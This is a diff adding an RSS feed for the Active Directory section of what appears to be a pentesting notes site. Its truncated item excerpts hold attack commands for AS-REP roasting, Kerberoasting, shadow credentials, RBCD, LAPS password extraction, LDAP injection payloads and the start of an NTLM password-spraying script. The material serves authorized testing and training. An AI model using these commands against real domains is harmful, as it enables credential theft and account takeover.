@@ -1,0 +1,110 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Active Directory on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/windows/active-directory/</link>
+    <description>Recent content in Active Directory on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 11:47:56 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/windows/active-directory/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>AS-REP Roasting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/as-rep-roasting/</link>
+      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/as-rep-roasting/</guid>
+      <description>Enumeration linkLists users and passwords is not required Kerberos pre auth. Used for ASREPRoasting.&#xA;impacket-GetNPUsers -dc-ip &amp;lt;target-ip&amp;gt; example.local/ -no-pass -usersfile users.txt impacket-GetNPUsers -dc-ip &amp;lt;target-ip&amp;gt; example.local/&amp;lt;username&amp;gt; -no-pass -format hashcat # Without authenticatino netexec ldap &amp;lt;target-ip&amp;gt; -u users.txt -p &amp;#39;&amp;#39; --asreproast output.txt # With authentication netexec ldap &amp;lt;target-ip&amp;gt; -u username -p password --asreproast output.txt If we find a password hash, crack it.&#xA;john --format=krb5asrep --wordlist=wordlist.txt hash.txt # or hashcat -m 18200 -a 0 hash.</description>
+    </item>
+    <item>
+      <title>Kerberoasting Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/kerberoasting-attack/</link>
+      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/kerberoasting-attack/</guid>
+      <description>Attack linkIf we have a password hash of a user, we might be able to find another user credential using the hash.&#xA;impacket-GetUserSPNs -hashes &amp;lt;lmhash&amp;gt;:&amp;lt;nthash&amp;gt; example.local/username -outputfile hashes.txt # Without pre-authentication # -no-preauth: https://github.com/SecureAuthCorp/impacket/pull/1413 impacket-GetUserSPNs -no-preauth username -usersfile users.txt -dc-host &amp;lt;ip-or-host&amp;gt; example.local/ netexec ldap &amp;lt;target-ip&amp;gt; -u username -p password --kerberoasting output.txt netexec ldap &amp;lt;target-ip&amp;gt; -u &amp;#39;&amp;#39; -p &amp;#39;&amp;#39; --kerberoasting output.txt After finding hashes, we can crack it or use for pass-the-hash attack.</description>
+    </item>
+    <item>
+      <title>LDAP (Lightweight Directory Access Protocol) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/ldap-pentesting/</link>
+      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/ldap-pentesting/</guid>
+      <description>Enumeration link # Nmap nmap --script ldap-brute --script-args ldap.base=&amp;#39;&amp;#34;cn=users,dc=cqure,dc=net&amp;#34;&amp;#39; -p 389 &amp;lt;target-ip&amp;gt; nmap --script ldap-search -p 389 &amp;lt;target-ip&amp;gt; nmap --script ldap-* -p 389 &amp;lt;target-ip&amp;gt; nmap --script &amp;#34;ldap* and not brute&amp;#34; -p 389 &amp;lt;target-ip&amp;gt; # NetExec # -k: Use Kerberos authentication netexec ldap &amp;lt;target-ip&amp;gt; -u usernames.txt -p &amp;#39;&amp;#39; -k # --trusted-for-delegation: Enumerate computers and users with the flag `TRUSTED_FOR_DELEGATION` # reference: https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties#property-flag-descriptions netexec ldap &amp;lt;target-ip&amp;gt; -u username -p password --trusted-for-delegation Search LDAP linkBelows are defined in LDAP.</description>
+    </item>
+    <item>
+      <title>Shadow Credentials</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/shadow-credentials/</link>
+      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/shadow-credentials/</guid>
+      <description>Exploit linkIf the attacker can modify the target object&amp;rsquo;s (user or computer account) attribute msDS-KeyCredentialLink and append it with alternate credentials in the form of certificates, he takes over the account in AD.&#xA;Using Certipy link # -k: Use Kerberos authentication certipy shadow auto -account &amp;#34;targetuser&amp;#34; -u &amp;#34;username@example.local&amp;#34; -p &amp;#39;password&amp;#39; -dc-ip 10.0.0.1 -target dc.example.local -k Using Whisker linkWhisker is a C# tool for taking over Active Directory user and computer accounts by manipulating their msDS-KeyCredentialLink attribute.</description>
+    </item>
+    <item>
+      <title>SMB (Server Message Block) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/smb-pentesting/</link>
+      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/smb-pentesting/</guid>
+      <description>Enumeration linkTo enumerate automatically, we can use various tools such as nmap, smbclient, and so on&#xA;nmap --script smb-brute -p 445 &amp;lt;target-ip&amp;gt; nmap --script smb-enum-shares.nse,smb-enum-users.nse -p 445 &amp;lt;target-ip&amp;gt; nmap --script smb-enum* -p 445 &amp;lt;target-ip&amp;gt; nmap --script smb-protocols -p 445 &amp;lt;target-ip&amp;gt; nmap --script smb-vuln* -p 445 &amp;lt;target-ip&amp;gt; # NetBIOS names nmblookup -A 10.0.0.1 nbtscan 10.0.0.1 # Enum4linux enum4linux &amp;lt;target-ip&amp;gt; # All enumeration enum4linux -a &amp;lt;target-ip&amp;gt; # Verbose enum4linux -v &amp;lt;target-ip&amp;gt; # Specify username and password enum4linux -u username -p password &amp;lt;target-ip&amp;gt; # Enum4linux-ng # -A: All simple enumeration including nmblookup enum4linux-ng -A &amp;lt;target-ip&amp;gt; # -As: All simple short enumeration without NetBIOS names lookup enum4linux-ng -As &amp;lt;target-ip&amp;gt; # -u: Specific username # -p: Specific password enum4linux-ng -u &amp;#34;administrator&amp;#34; -p &amp;#34;password&amp;#34; &amp;lt;target-ip&amp;gt; # NetExec (https://www.</description>
+    </item>
+    <item>
+      <title>Kerberos Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/kerberos-pentesting/</link>
+      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/kerberos-pentesting/</guid>
+      <description>Enumeration linkTo enumerate automatically, you can use nmap.&#xA;nmap --script krb5-enum-users --script-args krb5-enum-users.realm=&amp;#39;example.local&amp;#39;-p 88 &amp;lt;target-ip&amp;gt; Brute Force Authentication linkKerbrute is a tool to perform Kerberos pre-auth bruteforcing.&#xA;The wordlist (e.g. combos.txt) specified must be the &amp;ldquo;username:password&amp;rdquo; combinations.&#xA;# -v: verbose mode *it&amp;#39;s recommended to add this flag otherwise we cannot confirm if the user exist or not. # --dc: domain controller # -d: domain # combos.txt: the wordlist specified must be combinations with &amp;#34;username:password&amp;#34;.</description>
+    </item>
+    <item>
+      <title>AD CS (Active Directory Certificate Services) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/ad-cs-pentesting/</link>
+      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/ad-cs-pentesting/</guid>
+      <description>Enumeration linkWe can retrieve certificates information on target Windows machine using certutil.&#xA;# Dump general information certutil -dump # Dump information about certificate authority certutil -ca certutil -catemplates # List all templates certutil -template # specify the template certutil -template ExampleTemplate Then check if Allow Full Control or Allow Write include the group which current user belongs to. If so, we can modify the template and might be able to escalate privilege.</description>
+    </item>
+    <item>
+      <title>BloodHound SharpHound for Active Directory</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/bloodhound-sharphound/</link>
+      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/bloodhound-sharphound/</guid>
+      <description>Enumerate Active Directory link1. Collect Information with Sharphound linkIn target machine, download SharpHound and run.&#xA;# Enumerate the AD information that can be visualized in Bloodhound Sharphound.exe --CollectionMethods All --Domain dc.example.com --ExcludeDCs Then the zip file will be generated. This file can be displayed in Bloodhound.&#xA;To transfer the zip file to local machine, run the following command in local machine.&#xA;scp &amp;lt;ad_username&amp;gt;@example.com:C:/Path/To/&amp;lt;sharphound_result&amp;gt;.zip . 2. Start Bloodhound linkIn local machine, start neo4j console.</description>
+    </item>
+    <item>
+      <title>DACL (Discretionary Access Control List) Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/dacl-attack/</link>
+      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/dacl-attack/</guid>
+      <description>Add Rights linkWe may be able to take a full control of securable objects by getting GenericAll permission on OU (Organizational Unit).&#xA;1. Ask TGT for Kerberos Authentication linkIf we want to use Kerberos authentication for attacking DACL, we need to retrieve a TGT for specific user at first. In addition, to avoid authentication error, we need to synchronize the system time with the domain controller using ntpdate or rdate.</description>
+    </item>
+    <item>
+      <title>RBCD (Resource-Based Constrained Delegation) Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/pbcd-attack/</link>
+      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/pbcd-attack/</guid>
+      <description>Exploit linkReference: https://github.com/tothi/rbcd-attack#abusing-kerberos-resource-based-constrained-delegation&#xA;0. Prerequisites linkTo achieve this attack successfully, we need the following conditions:&#xA;A domain account who has permission to write the computer (msDS-AllowedToActOnBehalfOfOtherIdentity property of the domain object). A domain account who has permission to create a new computer. LDAP (389) and SAMR (445) or LDAPS (636) access to the DC. Kerberos (88) access to the DC. 1. Create Fake Computer link impacket-addcomputer -computer-name &amp;#39;fakecomputer$&amp;#39; -computer-pass &amp;#39;password&amp;#39; -dc-ip 10.</description>
+    </item>
+    <item>
+      <title>LDAP Injection</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/ldap-injection/</link>
+      <pubDate>Fri, 22 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/ldap-injection/</guid>
+      <description>Basic Payloads link (&amp;amp;uid=*)(userPassword=*) (&amp;amp;uid=*)|(userPassword=*) (&amp;amp;uid=*)|(objectClass=*)(userPassword=password123) *)(uid=*))(|(password=*) </description>
+    </item>
+    <item>
+      <title>Netlogon Elavasion of Privilege</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/netlogon-elavasion-of-privilege/</link>
+      <pubDate>Wed, 08 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/netlogon-elavasion-of-privilege/</guid>
+      <description>Exploitation linkThere is a lot of Poc in online.&#xA;Here, we’ll use this repository from GitHub.</description>
+    </item>
+    <item>
+      <title>LAPS (Local Administrator Password Solution) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/laps-pentesting/</link>
+      <pubDate>Thu, 22 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/laps-pentesting/</guid>
+      <description>Enumeration link msfconsole use post/windows/gather/credentials/enum_laps set session 2 exploit Obtain Administrator&amp;rsquo;s Password linkFirst, check if you are in the LAPS_Readers group.&#xA;net user &amp;lt;current-username&amp;gt; # Global Group memberships *LAPS_Readers Using Get-ADComputer linkGet-ADComputer gets the information of the Active Directory computer.&#xA;Get-ADComputer -Identity &amp;#39;&amp;lt;active-directory-computer-name&amp;gt;&amp;#39; -property &amp;#39;ms-mcs-admpwd&amp;#39; Using Get-LAPSPasswords.ps1 link Download the Payload in Local Machine&#xA;If you are in LAPS_Readers, you can get the administrator&amp;rsquo;s password using Get-LAPSPasswords.ps1{:target=&amp;quot;_blank&amp;quot;}{:rel=&amp;ldquo;noopener&amp;rdquo;}.&#xA;wget https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1 Transfer the Payload to Target Machine</description>
+    </item>
+    <item>
+      <title>NTLM (New Technology LAN Manager) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/ntlm-pentesting/</link>
+      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/ntlm-pentesting/</guid>
+      <description>Password Spraying Attack (Brute Force Credentials) linkFirst off, prepare the wordlist of usernames.&#xA;anthony.reynolds samantha.thompson dawn.turner frances.chapman ... Next create the exploit for brute force attack.&#xA;#!/usr/bin/python3 import requests from requests_ntlm import HttpNtlmAuth import sys, getopt class NTLMSprayer: def __init__(self, fqdn): self.HTTP_AUTH_FAILED_CODE = 401 self.HTTP_AUTH_SUCCEED_CODE = 200 self.verbose = True self.fqdn = fqdn def load_users(self, userfile): self.users = [] lines = open(userfile, &amp;#39;r&amp;#39;).readlines() for line in lines: self.users.append(line.replace(&amp;#34;\r&amp;#34;, &amp;#34;&amp;#34;).replace(&amp;#34;\n&amp;#34;, &amp;#34;&amp;#34;)) def password_spray(self, password, url): print (&amp;#34;[*] Starting passwords spray attack using the following password: &amp;#34; &amp;#43; password) count = 0 for user in self.</description>
+    </item>
+  </channel>
+</rss>
